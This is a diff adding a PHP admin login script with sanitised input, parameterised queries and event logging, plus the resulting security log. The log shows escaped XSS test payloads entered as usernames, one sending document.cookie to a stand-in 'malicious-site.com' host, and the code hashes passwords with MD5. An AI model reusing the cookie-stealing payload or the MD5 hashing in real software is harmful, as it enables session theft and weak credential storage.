@@ -1,0 +1,81 @@
+<?php
+session_start();
+error_reporting(0);
+include('includes/config.php');
+
+// Function to sanitize input data
+function sanitize_input($data) {
+    $data = trim($data);
+    $data = stripslashes($data);
+    $data = htmlspecialchars($data);
+    return $data;
+}
+
+// Function to log events
+function log_event($event) {
+    $log_file = 'security_log.txt';
+    $event = date('Y-m-d H:i:s') . ' - ' . $event . PHP_EOL;
+    file_put_contents($log_file, $event, FILE_APPEND | LOCK_EX);
+}
+
+if($_SESSION['alogin'] != ''){
+    $_SESSION['alogin'] = '';
+}
+
+if(isset($_POST['login'])) {
+    // Sanitize input data
+    $username = sanitize_input($_POST['username']);
+    $password = md5($_POST['password']); // Avoid using MD5 for password hashing, consider more secure methods like bcrypt
+
+    // Prepare SQL statement with parameterized query
+    $sql = "SELECT UserName, Password FROM admin WHERE UserName = :username AND Password = :password";
+    $query = $dbh->prepare($sql);
+    $query->bindParam(':username', $username, PDO::PARAM_STR);
+    $query->bindParam(':password', $password, PDO::PARAM_STR);
+
+    // Execute the query
+    $query->execute();
+
+    // Fetch the results
+    $results = $query->fetchAll(PDO::FETCH_OBJ);
+
+    // Check if there are any results
+    if($query->rowCount() > 0) {
+        $_SESSION['alogin'] = $username;
+        // Log successful login
+        log_event("Successful login by user: $username");
+        echo "<script type='text/javascript'> document.location ='admin/dashboard.php'; </script>";
+    } else {
+        // Log failed login attempt
+        log_event("Failed login attempt for username: $username");
+        echo "<script>alert('Invalid Details');</script>";
+    }
+}
+
+// Example of logging access to sensitive resource
+if($_SESSION['alogin'] == 'admin') {
+    // Log access to sensitive resource
+    log_event("Access to sensitive resource by user: admin");
+}
+?>
+2024-04-16 16:45:21 - Failed login attempt for username: root
+2024-04-16 16:45:25 - Failed login attempt for username: dsdsd
+2024-04-16 17:55:17 - Failed login attempt for username: root
+2024-04-16 17:55:25 - Successful login by user: nabilnasser
+2024-04-16 17:56:06 - Failed login attempt for username: root
+2024-04-16 17:56:09 - Failed login attempt for username: &lt;script&gt;alert(&#039;XSS Attack!&#039;);&lt;/script&gt;
+2024-04-16 17:56:43 - Failed login attempt for username: &lt;script&gt;alert(&#039;XSS Attack!&#039;);&lt;/script&gt;
+2024-04-16 17:56:47 - Failed login attempt for username: root
+2024-04-16 17:56:55 - Successful login by user: nabilnasser
+2024-04-16 17:57:09 - Failed login attempt for username: root
+2024-04-16 17:57:12 - Failed login attempt for username: &lt;script&gt;alert(&#039;XSS Attack!&#039;);&lt;/script&gt;
+2024-04-16 17:57:31 - Failed login attempt for username: &lt;script&gt;alert(&#039;XSS Attack!&#039;);&lt;/script&gt;
+2024-04-16 17:57:36 - Successful login by user: nabilnasser
+2024-04-16 19:24:04 - Successful login by user: nabilnasser
+2024-04-16 20:25:44 - Failed login attempt for username: root
+2024-04-16 20:25:53 - Successful login by user: nabilnasser
+2024-04-17 14:47:02 - Failed login attempt for username: &lt;script&gt;fetch(&#039;https://malicious-site.com/log?key=&#039; + document.cookie)&lt;/script&gt;
+2024-04-17 14:47:08 - Failed login attempt for username: root
+2024-04-17 14:47:18 - Failed login attempt for username: root
+2024-04-17 14:47:38 - Failed login attempt for username: root
+2024-04-17 14:50:34 - Failed login attempt for username: &lt;script&gt;alert(&#039;XSS Attack!&#039;);&lt;/script&gt;
